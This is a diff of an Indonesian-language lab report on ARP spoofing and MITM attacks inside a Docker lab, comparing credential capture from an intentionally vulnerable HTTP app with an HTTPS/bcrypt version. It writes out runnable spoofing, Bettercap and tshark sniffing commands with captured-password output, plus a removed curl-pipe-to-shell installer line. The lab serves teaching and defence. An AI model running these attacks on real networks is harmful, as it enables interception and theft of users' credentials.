@@ -391,6 +391,8 @@ app.use(helmet({
 | JWT      | Application    | ❌ Base64 token          | ✅ HMAC-signed                        | Auth token aman      |
 | Bcrypt   | Application    | ❌ Plaintext             | ✅ Cost=12                            | Hash password        |
 | CSP      | Application    | ❌ Tidak ada             | ✅ Helmet                             | Anti XSS             |
+| MongoDB  | Data           | ❌ Plaintext pwd di DB   | ✅ Bcrypt hash di DB                  | Penyimpanan data     |
+| Audit Log| Application    | ❌ Tidak ada             | ✅ MongoDB audit_logs (TTL 7d)        | Security monitoring  |
 
 ### 2.11 Man-in-the-Middle Attack
 
@@ -449,22 +451,33 @@ URL: https://ijircst.org/view_abstract.php?title=Detecting-and-Preventing-ARP-Sp
 
 ### 2.14 Perbandingan dengan Metode yang Diusulkan
 
-| Aspek                 | Penelitian Sebelumnya          | Metode yang Diusulkan                 |
-| --------------------- | ------------------------------ | ------------------------------------- |
-| Environment           | Docker bridge sederhana        | Docker + Tailscale (isolasi VPN)      |
-| Aplikasi Demo         | Script sederhana / static page | Full-stack React + Express            |
-| Versi Aman            | Tidak disediakan               | HTTPS dengan security best practices  |
-| Perbandingan          | Hanya serangan                 | Side-by-side HTTP vs HTTPS            |
-| Framework Referensi   | Beragam                        | MITRE ATT&CK + OWASP Top 10:2025      |
-| Mitigasi              | Teori / Static ARP             | Implementasi TLS, Helmet, JWT, bcrypt |
-| Host sebagai Attacker | Dalam container                | Host via Tailscale (lebih realistis)  |
+| Aspek                 | Penelitian Sebelumnya          | Metode yang Diusulkan                       |
+| --------------------- | ------------------------------ | ------------------------------------------- |
+| Arsitektur            | Monolitik / script sederhana   | **Microservices** (Frontend, Backend, Database terpisah) |
+| Environment           | Docker bridge sederhana        | Docker bridge (Layer 2) + Kali Linux container |
+| Database              | Tidak ada / in-memory          | **MongoDB** (shared instance, 2 database)    |
+| Penyimpanan Password  | Tidak dibandingkan             | Plaintext (vulnerable_db) vs Bcrypt (secure_db) |
+| Aplikasi Demo         | Script sederhana / static page | Full-stack React + Express (2 versi)        |
+| Versi Aman            | Tidak disediakan               | HTTPS + TLS, JWT, bcrypt, Helmet, HSTS      |
+| Perbandingan          | Hanya serangan                 | Side-by-side HTTP vs HTTPS + DB comparison  |
+| Framework Referensi   | Beragam                        | MITRE ATT&CK + OWASP Top 10:2025           |
+| Mitigasi Layer App    | Teori / tidak ada              | Implementasi TLS, Helmet, JWT, bcrypt       |
+| Mitigasi Layer Data   | Tidak ada                      | Schema validation, audit logging, TTL       |
+| Mitigasi Layer Network| Static ARP (teori)             | Tailscale VPN sebagai secure management plane |
+| Attacker Environment  | Script manual di host          | Container Kali Linux (pre-installed tools)  |
+| Deteksi ML            | Memerlukan data besar          | Menyediakan .pcap dataset untuk future ML   |
 
-**Kontribusi/Perbaikan yang diusulkan:**
+**Kontribusi/Perbaikan terhadap Keterbatasan Penelitian Terdahulu:**
 
-1. Lingkungan lab yang lebih realistis dengan Tailscale VPN isolation
-2. Aplikasi full-stack (React + Express) dengan dua versi (vulnerable & secure)
-3. Perbandingan langsung dampak serangan terhadap HTTP vs HTTPS
-4. Implementasi solusi keamanan yang komprehensif sesuai OWASP guidelines
+1. **Menjawab Lee et al. (2023)** [6] — *"Belum menyediakan solusi implementatif atau perbandingan dengan versi aman"*
+   - **Solusi:** Menyediakan arsitektur **microservices** dengan dua versi aplikasi (vulnerable HTTP vs secure HTTPS) yang terhubung ke satu database MongoDB. Demonstrasi menunjukkan bahwa **infrastruktur database yang sama** menghasilkan keamanan yang **berbeda** tergantung bagaimana aplikasi memperlakukan data (plaintext vs bcrypt hash).
+   - **Tambahan:** Tailscale VPN diimplementasikan sebagai secure management plane — akses SSH dan database server hanya melalui WireGuard tunnel, tidak terekspos di bridge network yang rentan [8].
+
+2. **Menjawab Du, W. — SEED Labs** [5] — *"Kurang pada mitigasi layer aplikasi (TLS, JWT, dll.)"*
+   - **Solusi:** Mengimplementasikan Defense in Depth di **empat layer**: transport (TLS 1.2+, HSTS), aplikasi (JWT, bcrypt, Helmet, rate limiting, input validation, audit logging), data (schema validation, select:false, TTL, unique index), dan network (VPN management plane). Setiap mitigasi diukur efektivitasnya melalui percobaan sniffing.
+
+3. **Menjawab Kumar & Dash (2024)** [7] — *"Memerlukan training data besar dan kompleksitas deployment"*
+   - **Solusi:** Project ini menyediakan environment yang menghasilkan dataset traffic (.pcap) dari skenario serangan nyata (ARP Spoofing + MITM), yang dapat digunakan sebagai training data untuk model ML detection di penelitian lanjutan. Pendekatan rule-based (Wireshark display filter) [13] digunakan sebagai alternatif deteksi yang lebih ringan tanpa memerlukan training.
 
 ---
 
@@ -495,77 +508,76 @@ Analisis OWASP Top 10              Build Secure App (HTTPS)
 
 ### 3.2 Arsitektur Sistem
 
-Sistem terdiri dari empat komponen utama yang terhubung melalui Tailscale VPN:
+Sistem menggunakan **Docker bridge network** (Layer 2) sebagai broadcast domain bersama, memungkinkan simulasi ARP Spoofing yang realistis. Tailscale VPN diposisikan sebagai **secure management plane** untuk akses SSH dan database.
 
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│                     HOST (Attacker)                              │
-│   ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐  │
-│   │ ARP Spoofer  │  │ Credential   │  │ Bettercap / Wireshark│  │
-│   │ (Scapy)      │  │ Sniffer      │  │ (MITM tools)         │  │
-│   └──────┬───────┘  └──────┬───────┘  └──────────┬───────────┘  │
-│          └────────┬────────┘                      │              │
-│                   │      Tailscale Network        │              │
-│   ┌───────────────┼──────────────────────────────┼──────────┐   │
-│   │               │  Docker Compose Environment  │          │   │
-│   │               │                              │          │   │
-│   │  ┌────────────┴────────────┐                 │          │   │
-│   │  │ Client Victim (webtop)  │◀── ARP Poison ──┘          │   │
-│   │  │ ┌────────────────────┐  │                            │   │
-│   │  │ │ Tailscale Sidecar  │  │   ← TS_AUTHKEY_CLIENT      │   │
-│   │  │ └────────────────────┘  │                            │   │
-│   │  │ ┌────────────────────┐  │                            │   │
-│   │  │ │ XFCE Desktop + 🌐  │  │   ← http://localhost:3080  │   │
-│   │  │ │ (Alpine webtop)    │  │                            │   │
-│   │  │ └────────────────────┘  │                            │   │
-│   │  └──────────┬──────────────┘                            │   │
-│   │             │ browses to                                │   │
-│   │  ┌──────────┴────────┐  ┌───────────────┐              │   │
-│   │  │ Vulnerable Stack  │  │ Secure Stack  │              │   │
-│   │  │ (Tailscale)       │  │ (Tailscale)   │              │   │
-│   │  │ ┌──────┐┌───────┐ │  │ ┌──────┐┌───┐│              │   │
-│   │  │ │React ││Express│ │  │ │React ││Exp.││              │   │
-│   │  │ │:3000 ││:5000  │ │  │ │:3443 ││5443││              │   │
-│   │  │ │ HTTP ││ HTTP  │ │  │ │HTTPS ││TLS ││              │   │
-│   │  │ └──────┘└───────┘ │  │ └──────┘└───┘│              │   │
-│   │  └───────────────────┘  └──────────────┘              │   │
-│   └───────────────────────────────────────────────────────┘   │
-└─────────────────────────────────────────────────────────────────┘
+  Docker Bridge Network (lab-network: 172.20.0.0/24) — Layer 2
+  ┌────────────────────────────────────────────────────────────────┐
+  │                                                                │
+  │  ┌─────────────────┐              ┌─────────────────────────┐  │
+  │  │ Attacker         │ ARP Spoof   │ Client Victim           │  │
+  │  │ (Kali Linux)    │────────────▶│ (webtop XFCE)           │  │
+  │  │ 172.20.0.100    │              │ 172.20.0.10             │  │
+  │  └─────────────────┘              └──────────┬──────────────┘  │
+  │                                    ┌─────────┴─────────┐       │
+  │  ┌────────────────────┐     ┌──────┴──────┐    ┌───────┴─────┐ │
+  │  │ Database (Shared)  │     │ Vuln App    │    │ Sec App     │ │
+  │  │ (MongoDB)          │◀────│ HTTP        │    │ HTTPS (TLS) │ │
+  │  │ 172.20.0.50 :27017 │◀────│ .20 :3000   │    │ .30 :3443   │ │
+  │  │ ┌───────────────┐  │     │ .21 :5000   │    │ .31 :5443   │ │
+  │  │ │vulnerable_db  │  │     └─────────────┘    │ ┌─────────┐ │ │
+  │  │ │(PLAINTEXT pwd)│  │                        │ │Tailscale│ │ │
+  │  │ ├───────────────┤  │                        │ │(SSH/DB) │ │ │
+  │  │ │secure_db      │  │                        │ └─────────┘ │ │
+  │  │ │(BCRYPT hash)  │  │                        └─────────────┘ │
+  │  │ └───────────────┘  │                                        │
+  │  └────────────────────┘                                        │
+  └────────────────────────────────────────────────────────────────┘
 ```
 
-**1. Host Machine (Attacker)**
+**Arsitektur Microservices:** Setiap komponen (frontend, backend, database) dipisahkan ke container masing-masing. Satu instance MongoDB melayani kedua aplikasi — **perbedaan keamanan ada di layer aplikasi** (bagaimana data disimpan dan ditransmisikan), bukan di infrastruktur database.
 
-- Menjalankan script ARP Spoofing (`arp_spoof.py`) menggunakan Scapy
-- Menjalankan Credential Sniffer (`sniff_credentials.py`), Bettercap, atau Wireshark
-- Terhubung ke Tailscale VPN — melakukan ARP Poisoning antara client-victim dan server
+**1. Database (MongoDB — 172.20.0.50)**
 
-**2. Client Victim (webtop — Target MITM)**
+- Satu instance MongoDB (`mongo:7`) yang melayani kedua aplikasi
+- **`vulnerable_db`**: Password disimpan dalam **plaintext** — demonstrasi kerentanan OWASP A04:2025
+- **`secure_db`**: Password disimpan sebagai **bcrypt hash** (cost 12) — solusi keamanan
+- Init script (`init-mongo.js`) melakukan seeding data saat container pertama kali distart
+- Ini mendemonstrasikan bahwa keamanan **bukan hanya soal infrastruktur** (database sama), tapi bagaimana **aplikasi memperlakukan data sensitif**
+
+**2. Attacker (Kali Linux — 172.20.0.100)**
+
+- Container `kalilinux/kali-rolling` dengan Scapy, Bettercap, tshark, arp-scan
+- Menjalankan ARP Spoofing antara client-victim dan server pada bridge network
+- Akses: `docker compose exec attacker bash`
+
+**3. Client Victim (webtop — 172.20.0.10)**
 
 - Container `linuxserver/webtop:alpine-xfce` — desktop Linux dengan browser GUI
-- Tailscale Sidecar (`ts-client`) — terhubung ke Tailnet sebagai korban
 - Diakses dari host via `http://localhost:3080`
-- Mensimulasikan pengguna yang sedang login ke aplikasi web
+- Target utama ARP Spoofing — traffic-nya diintersep oleh attacker
 
-**3. Vulnerable Stack (Server — HTTP)**
+**4. Vulnerable Stack (HTTP — 172.20.0.20/21)**
 
-- React Frontend (port 3000) — tanpa enkripsi
-- Express Backend (port 5000) — tanpa TLS
-- Tailscale Sidecar (`ts-vulnerable`) — untuk konektivitas VPN
+- React Frontend (port 3000) dan Express Backend (port 5000) — tanpa enkripsi
+- Backend terhubung ke MongoDB `vulnerable_db` — password disimpan plaintext
 
-**4. Secure Stack (Server — HTTPS)**
+**5. Secure Stack (HTTPS — 172.20.0.30/31)**
 
-- React Frontend (port 3443) — dengan TLS
-- Express Backend (port 5443) — dengan TLS, Helmet, JWT, bcrypt
-- Tailscale Sidecar (`ts-secure`) — untuk konektivitas VPN
+- React Frontend (port 3443) dan Express Backend (port 5443) — dengan TLS, Helmet, JWT, bcrypt
+- Backend terhubung ke MongoDB `secure_db` — password disimpan sebagai bcrypt hash
+- **Tailscale sidecar** — SSH dan database hanya diakses via WireGuard tunnel
 
-**Node pada Tailscale Network:**
-
-| Node | Container | IP Tailscale | Peran | Auth Key |
-| ---- | --------- | ------------ | ----- | -------- |
-| Host | — | Sudah login | Attacker (ARP Spoof + Sniff) | Login manual |
-| `ts-client` | webtop (XFCE) | 100.x.x.a | Victim yang browsing | `TS_AUTHKEY_CLIENT` |
-| `ts-vulnerable` | React + Express | 100.x.x.b | Server HTTP (rentan) | `TS_AUTHKEY_VULNERABLE` |
-| `ts-secure` | React + Express | 100.x.x.c | Server HTTPS (aman) | `TS_AUTHKEY_SECURE` |
+| Container | IP | Port | Peran |
+| --------- | -- | ---- | ----- |
+| database | 172.20.0.50 | 27017 | MongoDB (shared) |
+| attacker | 172.20.0.100 | — | Kali Linux (MITM) |
+| client-victim | 172.20.0.10 | 3080→3000 | Victim desktop |
+| vuln-frontend | 172.20.0.20 | 3000 | HTTP frontend |
+| vuln-backend | 172.20.0.21 | 5000 | HTTP backend → vulnerable_db |
+| sec-frontend | 172.20.0.30 | 3443 | HTTPS frontend |
+| sec-backend | 172.20.0.31 | 5443 | HTTPS backend → secure_db |
+| ts-secure | (shared) | — | Tailscale VPN (SSH/DB) |
 
 ### 3.3 Teknologi yang Digunakan
 
@@ -573,8 +585,11 @@ Sistem terdiri dari empat komponen utama yang terhubung melalui Tailscale VPN:
 | -------------------- | ----------------------- | ---------- |
 | Frontend             | React                   | 18.x       |
 | Backend              | Node.js (Express)       | 20.x / 4.x |
+| Database             | MongoDB                 | 7.x        |
+| ODM                  | Mongoose                | 8.x        |
 | Container            | Docker & Docker Compose | Latest     |
-| VPN Isolation        | Tailscale [8]           | Latest     |
+| Attacker Container   | Kali Linux (kali-rolling) | Latest   |
+| VPN Management Plane | Tailscale [8]           | Latest     |
 | Attack Tool (Script) | Python (Scapy)          | 3.x        |
 | Attack Tool (MITM)   | Bettercap [12]          | 2.x        |
 | Traffic Analyzer     | Wireshark / tshark [13][14] | 4.x   |
@@ -620,7 +635,7 @@ net.sniff on
 
 **Langkah Penggunaan Bettercap:**
 
-1. Jalankan: `sudo bettercap -iface tailscale0 -caplet mitm_attack.cap`
+1. Jalankan dari container attacker: `bettercap -iface eth0 -caplet bettercap/mitm_attack.cap`
 2. Bettercap otomatis melakukan ARP Spoofing dan mengaktifkan HTTP proxy
 3. Saat victim login di vulnerable app, kredensial muncul di output dengan tag `[http.proxy.auth]`
 4. Traffic disimpan ke file `.pcap` untuk analisis lanjutan di Wireshark
@@ -631,7 +646,7 @@ Wireshark digunakan sebagai packet analyzer utama untuk memverifikasi dan memvis
 
 | Fitur yang Digunakan | Fungsi                                                    |
 | -------------------- | --------------------------------------------------------- |
-| Live Capture         | Menangkap paket secara real-time pada interface Tailscale |
+| Live Capture         | Menangkap paket secara real-time pada interface container (eth0) |
 | Display Filter       | Memfilter paket spesifik (ARP, HTTP, TLS)                 |
 | Follow HTTP Stream   | Melihat keseluruhan sesi HTTP termasuk body request       |
 | ARP Analysis         | Mendeteksi duplikasi MAC dan gratuitous ARP               |
@@ -652,8 +667,7 @@ Wireshark digunakan sebagai packet analyzer utama untuk memverifikasi dan memvis
 
 **Langkah Penggunaan Wireshark:**
 
-1. Buka Wireshark → pilih interface `tailscale0`
-2. Set capture filter: `arp or port 5000 or port 5443`
+1. Di container attacker, jalankan tshark: `tshark -i eth0 -f "arp or port 5000 or port 5443" -w /tmp/capture.pcap`
 3. Mulai capture → jalankan ARP Spoofing → victim login
 4. Stop capture → gunakan display filter untuk analisis
 5. Klik kanan pada HTTP POST → **Follow → HTTP Stream** → lihat kredensial plaintext
@@ -662,12 +676,12 @@ Wireshark digunakan sebagai packet analyzer utama untuk memverifikasi dan memvis
 **Langkah Penggunaan tshark (CLI Wireshark):**
 
 ```bash
-# Capture traffic dan simpan ke file pcap
-tshark -i tailscale0 -f "arp or port 5000 or port 5443" \
+# Capture traffic dan simpan ke file pcap (dari container attacker)
+tshark -i eth0 -f "arp or port 5000 or port 5443" \
   -w /tmp/mitm-capture.pcap
 
 # Live display kredensial HTTP POST
-tshark -i tailscale0 -f "tcp port 5000" \
+tshark -i eth0 -f "tcp port 5000" \
   -Y "http.request.method == POST" \
   -T fields -e ip.src -e ip.dst \
   -e http.request.uri -e http.file_data
@@ -677,46 +691,23 @@ tshark -i tailscale0 -f "tcp port 5000" \
 
 #### Fase 1: Persiapan Environment
 
-**Langkah 1.1 — Install Prerequisites di Host:**
-
-```bash
-# Install Tailscale (host harus terhubung ke Tailnet sebagai attacker)
-curl -fsSL https://tailscale.com/install.sh | sh
-sudo tailscale up
-
-# Install Python dependencies untuk attack scripts
-cd attack-scripts
-pip install -r requirements.txt   # scapy, colorama
-
-# Install Bettercap (opsional, untuk Metode B)
-sudo apt install bettercap        # Linux
-# atau: brew install bettercap    # macOS
-
-# Install Wireshark + tshark (opsional, untuk Metode C)
-sudo apt install wireshark tshark
-```
-
-**Langkah 1.2 — Konfigurasi Environment Variables:**
+**Langkah 1.1 — Konfigurasi Environment:**
 
 ```bash
 # Copy file .env.example ke .env
 cp .env.example .env
 
-# Edit .env, isi 3 auth key dari Tailscale Admin Console
-# Generate di: https://login.tailscale.com/admin/settings/keys
-# Centang "Reusable" agar bisa dipakai ulang
+# Edit .env jika menggunakan Tailscale untuk management
 nano .env
 ```
 
 Isi `.env`:
 ```
-TS_AUTHKEY_VULNERABLE=tskey-auth-xxxxx-xxxxxxxxxxxxxxxx
-TS_AUTHKEY_SECURE=tskey-auth-xxxxx-xxxxxxxxxxxxxxxx
-TS_AUTHKEY_CLIENT=tskey-auth-xxxxx-xxxxxxxxxxxxxxxx
+TS_AUTHKEY=tskey-auth-xxxxx-xxxxxxxxxxxxxxxx  # Opsional, untuk SSH management
 JWT_SECRET=your-secret-key-here
 ```
 
-**Langkah 1.3 — Generate Sertifikat TLS (untuk Secure App):**
+**Langkah 1.2 — Generate Sertifikat TLS (untuk Secure App):**
 
 ```bash
 cd secure-app/backend/certs
@@ -725,7 +716,7 @@ bash generate-certs.sh
 cd ../../..
 ```
 
-**Langkah 1.4 — Build dan Deploy Semua Container:**
+**Langkah 1.3 — Build dan Deploy Semua Container:**
 
 ```bash
 # Build semua image
@@ -741,37 +732,30 @@ docker compose ps
 Output yang diharapkan:
 ```
 NAME              STATUS
-ts-vulnerable     running    ← Tailscale sidecar (Vulnerable)
+attacker          running    ← Kali Linux (attack tools)
+client-victim     running    ← Webtop XFCE desktop
 vuln-frontend     running    ← React HTTP frontend
 vuln-backend      running    ← Express HTTP backend
-ts-secure         running    ← Tailscale sidecar (Secure)
 sec-frontend      running    ← React HTTPS frontend
 sec-backend       running    ← Express HTTPS backend
-ts-client         running    ← Tailscale sidecar (Client Victim)
-client-victim     running    ← Webtop XFCE desktop
+ts-secure         running    ← Tailscale sidecar (management)
 ```
 
-**Langkah 1.5 — Verifikasi Konektivitas Tailscale:**
+**Langkah 1.4 — Verifikasi Konektivitas:**
 
 ```bash
-# Cek semua node yang terhubung ke Tailnet
-tailscale status
+# Masuk ke container attacker
+docker compose exec attacker bash
 
-# Output yang diharapkan:
-# 100.x.x.1   host-machine     ...
-# 100.x.x.2   vulnerable-app   ...  (tag:vulnerable)
-# 100.x.x.3   secure-app       ...  (tag:secure)
-# 100.x.x.4   client-victim    ...  (tag:client)
+# Test konektivitas ke semua container
+ping -c 3 172.20.0.10   # client-victim
+ping -c 3 172.20.0.20   # vulnerable-frontend
+ping -c 3 172.20.0.21   # vulnerable-backend
+ping -c 3 172.20.0.30   # secure-frontend
+ping -c 3 172.20.0.31   # secure-backend
 
-# Catat IP dari setiap node — dibutuhkan untuk serangan
-export TARGET_IP=100.x.x.4       # IP client-victim
-export VULN_SERVER_IP=100.x.x.2  # IP vulnerable-app
-export SECURE_SERVER_IP=100.x.x.3 # IP secure-app
-export GATEWAY_IP=100.x.x.1      # IP host/gateway
-
-# Test konektivitas
-ping -c 3 $TARGET_IP
-ping -c 3 $VULN_SERVER_IP
+# Scan network (dari attacker container)
+arp-scan --interface=eth0 172.20.0.0/24
 ```
 
 #### Fase 2: Akses Client Victim dan Login
@@ -787,30 +771,21 @@ Akan muncul desktop Linux XFCE dengan browser bawaan (Firefox/Chromium).
 **Langkah 2.2 — Akses Vulnerable App dari Client Victim:**
 
 Di dalam browser webtop:
-1. Buka `http://vulnerable-app:3000` → halaman login vulnerable app
+1. Buka `http://172.20.0.20:3000` → halaman login vulnerable app
 2. **Jangan login dulu** — tunggu attacker siap di Fase 3
 
 **Langkah 2.3 — Akses Secure App dari Client Victim:**
 
 Di dalam browser webtop:
-1. Buka `https://secure-app:3443` → halaman login secure app
+1. Buka `https://172.20.0.30:3443` → halaman login secure app
 2. Accept self-signed certificate warning
 3. **Jangan login dulu** — tunggu attacker siap di Fase 3
 
 #### Fase 3: Eksekusi Serangan MITM (3 Metode)
 
-> **⚠️ PENTING:** Semua perintah serangan dijalankan dari **terminal host** (bukan dari dalam webtop).
+> **⚠️ PENTING:** Semua perintah serangan dijalankan dari **container attacker** (`docker compose exec attacker bash`).
 
-**Langkah 3.0 — Aktifkan IP Forwarding (wajib untuk semua metode):**
-
-```bash
-# Linux
-echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
-
-# Verifikasi
-cat /proc/sys/net/ipv4/ip_forward
-# Output: 1
-```
+**Langkah 3.0 — IP Forwarding sudah diaktifkan otomatis** oleh entrypoint container attacker.
 
 ---
 
@@ -821,31 +796,25 @@ Metode ini menggunakan script Python buatan sendiri untuk ARP Spoofing dan crede
 **Terminal 1 — ARP Spoofing (meracuni ARP cache client-victim):**
 
 ```bash
-cd attack-scripts
-
 # ARP Spoofing: target = client-victim, gateway = vulnerable-app
-# Ini membuat traffic dari client-victim ke vulnerable-app melewati host
-sudo python3 arp_spoof.py -t $TARGET_IP -g $VULN_SERVER_IP
+python3 arp_spoof.py -t 172.20.0.10 -g 172.20.0.21
 
 # Output yang diharapkan:
 # [*] Starting ARP Spoofing...
-# [*] Target: 100.x.x.4 (client-victim)
-# [*] Gateway: 100.x.x.2 (vulnerable-app)
+# [*] Target: 172.20.0.10 (client-victim)
+# [*] Gateway: 172.20.0.21 (vulnerable-backend)
 # [+] Sending spoofed ARP packets...
-# [+] Packets sent: 10 | Elapsed: 5s
 ```
 
 **Terminal 2 — Credential Sniffer (menangkap HTTP login):**
 
 ```bash
-cd attack-scripts
-
 # Sniff HTTP POST requests pada port 5000 (backend vulnerable)
-sudo python3 sniff_credentials.py --mode http --port 5000
+python3 sniff_credentials.py --mode http --port 5000
 
 # Output saat victim login:
 # [!] CREDENTIAL CAPTURED!
-# [*] Source: 100.x.x.4 → Destination: 100.x.x.2
+# [*] Source: 172.20.0.10 → Destination: 172.20.0.21
 # [*] URL: POST /api/login
 # [*] Username: admin
 # [*] Password: admin123       ← PLAINTEXT!
@@ -855,18 +824,18 @@ sudo python3 sniff_credentials.py --mode http --port 5000
 
 ```bash
 # Sniff traffic HTTPS — membuktikan data terenkripsi
-sudo python3 sniff_credentials.py --mode https --port 5443
+python3 sniff_credentials.py --mode https --port 5443
 
 # Output saat victim login ke secure app:
-# [*] HTTPS Traffic dari 100.x.x.4 → Port 5443
+# [*] HTTPS Traffic dari 172.20.0.10 → Port 5443
 # [🔒] Data TERENKRIPSI - Tidak dapat dibaca!
 # [*] TLS Version: TLS 1.3
 ```
 
 **Di Client Victim (webtop browser):**
-1. Login ke `http://vulnerable-app:3000` dengan: `admin` / `admin123`
+1. Login ke `http://172.20.0.20:3000` dengan: `admin` / `admin123`
 2. Lihat Terminal 2 → **kredensial tertangkap dalam plaintext!**
-3. Login ke `https://secure-app:3443` dengan credentials yang sama
+3. Login ke `https://172.20.0.30:3443` dengan credentials yang sama
 4. Lihat Terminal 3 → **data terenkripsi, tidak terbaca!**
 
 **Hentikan serangan:** Tekan `Ctrl+C` di Terminal 1 → ARP cache otomatis dipulihkan.
@@ -880,10 +849,8 @@ Bettercap menggabungkan ARP Spoofing + HTTP Proxy + Credential Extraction dalam 
 **Terminal 1 — Jalankan Bettercap dengan Caplet:**
 
 ```bash
-cd attack-scripts
-
-# Jalankan Bettercap pada interface Tailscale
-sudo bettercap -iface tailscale0 -caplet bettercap/mitm_attack.cap
+# Jalankan Bettercap pada interface bridge (dari container attacker)
+bettercap -iface eth0 -caplet bettercap/mitm_attack.cap
 
 # Bettercap otomatis melakukan:
 # 1. Network discovery (net.probe)
@@ -895,7 +862,7 @@ sudo bettercap -iface tailscale0 -caplet bettercap/mitm_attack.cap
 **Output saat victim login ke HTTP:**
 ```
 [19:30:15] [sys.log] [inf] arp.spoof starting net.probe...
-[19:30:18] [sys.log] [inf] arp.spoof victim 100.x.x.4 spoofed
+[19:30:18] [sys.log] [inf] arp.spoof victim 172.20.0.10 spoofed
 [19:30:45] [http.proxy.auth] POST http://vulnerable-app:5000/api/login
            → username=admin password=admin123   ← TERTANGKAP!
 ```
@@ -920,8 +887,7 @@ Metode ini menggabungkan ARP Spoofing via Scapy dengan analisis visual menggunak
 **Terminal 1 — ARP Spoofing:**
 
 ```bash
-cd attack-scripts
-sudo python3 arp_spoof.py -t $TARGET_IP -g $VULN_SERVER_IP
+python3 arp_spoof.py -t 172.20.0.10 -g 172.20.0.21
 ```
 
 **Terminal 2 — Jalankan Wireshark GUI:**
@@ -930,8 +896,8 @@ sudo python3 arp_spoof.py -t $TARGET_IP -g $VULN_SERVER_IP
 # Buka Wireshark
 wireshark &
 
-# Di Wireshark GUI:
-# 1. Pilih interface: tailscale0
+# 1. Dari container attacker:
+tshark -i eth0 -f "arp or port 5000 or port 5443" -w /tmp/capture.pcap
 # 2. Set Capture Filter: arp or port 5000 or port 5443
 # 3. Klik tombol "Start" (ikon sirip hiu biru)
 ```
@@ -940,11 +906,11 @@ wireshark &
 
 ```bash
 # Capture semua traffic ke file pcap
-tshark -i tailscale0 -f "arp or port 5000 or port 5443" \
+tshark -i eth0 -f "arp or port 5000 or port 5443" \
   -w /tmp/mitm-capture.pcap &
 
 # Live display HTTP POST credentials
-tshark -i tailscale0 -f "tcp port 5000" \
+tshark -i eth0 -f "tcp port 5000" \
   -Y "http.request.method == POST" \
   -T fields -e ip.src -e ip.dst \
   -e http.request.uri -e http.file_data
@@ -994,7 +960,7 @@ tshark -i tailscale0 -f "tcp port 5000" \
 
 ```
 [2025-xx-xx HH:MM:SS] HTTP Traffic Terdeteksi
-Source: 100.x.x.x → Destination: 100.x.x.y
+Source: 172.20.0.10 → Destination: 172.20.0.21
 
   🔓 LOGIN REQUEST TERDETEKSI!
   ╔══════════════════════════════════════╗
@@ -1025,7 +991,7 @@ Source: 100.x.x.x → Destination: 100.x.x.y
 **Hasil Sniffing:**
 
 ```
-[HH:MM:SS] HTTPS Traffic dari 100.x.x.x → Port 5443
+[HH:MM:SS] HTTPS Traffic dari 172.20.0.10 → Port 5443
   🔒 Data TERENKRIPSI - Tidak dapat dibaca!
   Hex dump (tidak berguna): 17030300bf5a8e2f3c...
   ↑ Attacker tidak dapat mengekstrak informasi apapun
@@ -1046,7 +1012,7 @@ Source: 100.x.x.x → Destination: 100.x.x.y
 
 ```
 [19:30:15] [sys.log] [inf] arp.spoof starting net.probe...
-[19:30:18] [sys.log] [inf] arp.spoof victim 100.x.x.x spoofed
+[19:30:18] [sys.log] [inf] arp.spoof victim 172.20.0.10 spoofed
 [19:30:25] [http.proxy.auth] POST http://vulnerable-app:5000/api/login
            ├── Content-Type: application/json
            ├── Username: admin
@@ -1060,7 +1026,7 @@ Source: 100.x.x.x → Destination: 100.x.x.y
 **Output Bettercap terhadap HTTPS (Secure):**
 
 ```
-[19:35:10] [sys.log] [inf] arp.spoof victim 100.x.x.y spoofed
+[19:35:10] [sys.log] [inf] arp.spoof victim 172.20.0.10 spoofed
 [19:35:15] [net.sniff] TLS handshake detected → secure-app:5443
            └── Encrypted Application Data (cannot parse)
 ```
@@ -1080,9 +1046,9 @@ Menggunakan display filter `arp.opcode == 2` [13], Wireshark menunjukkan:
 
 ```
 No.  Time      Source           Destination      Protocol  Info
-1    0.000     aa:bb:cc:dd:ee   ff:ff:ff:ff:ff   ARP       Who has 100.x.x.x? Tell 100.x.x.1
-2    0.001     [Attacker MAC]   [Victim MAC]     ARP       100.x.x.1 is at [Attacker MAC]
-3    1.001     [Attacker MAC]   [Gateway MAC]    ARP       100.x.x.x is at [Attacker MAC]
+1    0.000     aa:bb:cc:dd:ee   ff:ff:ff:ff:ff   ARP       Who has 172.20.0.21? Tell 172.20.0.10
+2    0.001     [Attacker MAC]   [Victim MAC]     ARP       172.20.0.10 is at [Attacker MAC]
+3    1.001     [Attacker MAC]   [Gateway MAC]    ARP       172.20.0.21 is at [Attacker MAC]
 ```
 
 - ARP Reply dari attacker mengklaim bahwa IP gateway memiliki MAC attacker
@@ -1117,10 +1083,10 @@ Menggunakan filter `tcp.port == 5443 && tls`:
 
 ```
 No.  Time      Source           Destination      Protocol  Info
-45   5.230     100.x.x.x       100.x.x.y       TLSv1.3   Client Hello
-46   5.231     100.x.x.y       100.x.x.x       TLSv1.3   Server Hello, Certificate
-47   5.235     100.x.x.x       100.x.x.y       TLSv1.3   Application Data [encrypted]
-48   5.236     100.x.x.y       100.x.x.x       TLSv1.3   Application Data [encrypted]
+45   5.230     172.20.0.10       172.20.0.31       TLSv1.3   Client Hello
+46   5.231     172.20.0.31       172.20.0.10       TLSv1.3   Server Hello, Certificate
+47   5.235     172.20.0.10       172.20.0.31       TLSv1.3   Application Data [encrypted]
+48   5.236     172.20.0.31       172.20.0.10       TLSv1.3   Application Data [encrypted]
 ```
 
 - Setelah TLS handshake [16], semua data ditandai **"Application Data"** terenkripsi
@@ -1151,6 +1117,9 @@ No.  Time      Source           Destination      Protocol  Info
 | Data Transfer            | ✅ Ya                 | ❌ Tidak                |
 | Brute Force              | ✅ Tidak dibatasi     | ❌ Rate limited         |
 | Session Hijack           | ✅ Mudah              | ❌ Sulit (JWT + expiry) |
+| Password di Database     | ❌ Plaintext          | ✅ Bcrypt hash (cost 12)|
+| Database Schema          | ❌ Tanpa validation   | ✅ Unique, required, enum|
+| Audit Trail              | ❌ Tidak ada          | ✅ MongoDB audit_logs   |
 
 ### 4.6 Kaitan dengan Tugas Wireshark Sebelumnya
 
@@ -1168,33 +1137,60 @@ Pada tugas sebelumnya, analisis traffic menggunakan Wireshark menunjukkan:
 
 ### 4.7 Solusi Keamanan yang Diimplementasikan
 
-#### Layer Transport (Mencegah Data Terbaca)
+#### Layer Transport (Mencegah Data Terbaca — Menjawab Lee et al. [6])
 
-| Solusi         | Implementasi                       | Efektivitas                  |
-| -------------- | ---------------------------------- | ---------------------------- |
